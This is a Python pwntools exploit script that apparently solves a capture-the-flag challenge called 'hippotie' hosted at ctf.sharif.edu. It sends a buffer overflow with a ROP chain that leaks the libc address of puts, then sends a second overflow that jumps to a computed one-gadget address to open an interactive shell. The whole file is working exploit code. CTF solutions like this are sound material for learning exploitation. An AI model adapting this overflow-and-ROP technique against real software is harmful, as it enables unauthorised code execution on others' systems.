#!/usr/bin/env python


from pwn import *

context.update(arch='amd64', os='linux')

poprdi = pack(0x401483)
puts_plt = pack(0x4007f0)
leak_addr = pack(0x6027a8)
main = pack(0x401365)
offset_puts_magic_local = 0x29c260
offset_puts_magic_remote = 0x2a61c

#p = process(["./hippotie", ])
#print(pidof(p))
#raw_input()
p = remote(host="ctf.sharif.edu", port=54519)
print(p.recv())

payload = "A" * 536 + poprdi + leak_addr + puts_plt + main


def send_command(command):
    p.send(command + "\n")
    sleep(0.2)
    p.recv()


def get_leak_local(command):
    p.send(command + "\n")
    sleep(0.1)
    data = p.recv(547).encode("hex")
    print(data.decode("hex"))
    addr_leak = data[-14:-2]
    addr_leak = unpack(pack(int(addr_leak, 16), endianness="big"))
    addr_leak = str(hex(addr_leak >> 16))[2:]
    print(addr_leak)
    return addr_leak


def get_leak_remote(command):
    p.send(command + "\n")
    sleep(0.3)
    data = p.recv(730).encode("hex")
    #print(data)
    addr_leak = data[-12:]
    addr_leak = unpack(pack(int(addr_leak, 16), endianness="big"))
    addr_leak = str(hex(addr_leak >> 16))[2:]
    print(addr_leak)
    return addr_leak


send_command("1")
send_command("2")
send_command("2")
send_command("2")
send_command("2")
send_command("2")
send_command("3")
send_command(payload + "\n")
puts_addr = get_leak_remote("4")
sleep(1)
send_command("1")
send_command("2")
send_command("2")
send_command("2")
send_command("2")
send_command("2")
send_command("3")
payload_2 = "C" * 536 + pack(int(puts_addr, 16) - offset_puts_magic_remote)
send_command(payload_2 + "\n")
get_leak_local("4")
p.interactive()
